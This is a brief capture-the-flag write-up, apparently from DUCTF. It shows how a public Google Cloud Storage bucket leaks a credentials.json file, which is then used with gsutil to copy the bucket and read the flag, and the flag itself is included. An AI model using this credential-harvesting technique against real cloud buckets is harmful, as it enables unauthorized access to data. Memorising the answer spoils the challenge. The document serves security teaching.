#### Challenge:

I found this really cheap hosting provider to share my first game with everyone. Check it out!

https://jimmys-big-adventure.storage.googleapis.com/index.html

---

#### Solution:

- inspecting the page revels that it's hosted from google storage, thus some kind of `ACL` mishap happened there

```bash
curl https://storage.googleapis.com/jimmys-big-adventure
wget https://jimmys-big-adventure.storage.googleapis.com/credentials.json

# configure with credentials.json
gsutil config -e
gsutil cp -r  gs://jimmys-big-adventure .
cat ./jimmys-big-adventure/flag.txt 
```

---

<details><summary>FLAG:</summary>

```
DUCTF{Th0se_cr3ds_w3r3nt_m34nt_2_b33_th3r3}
```

</details>
<br/>
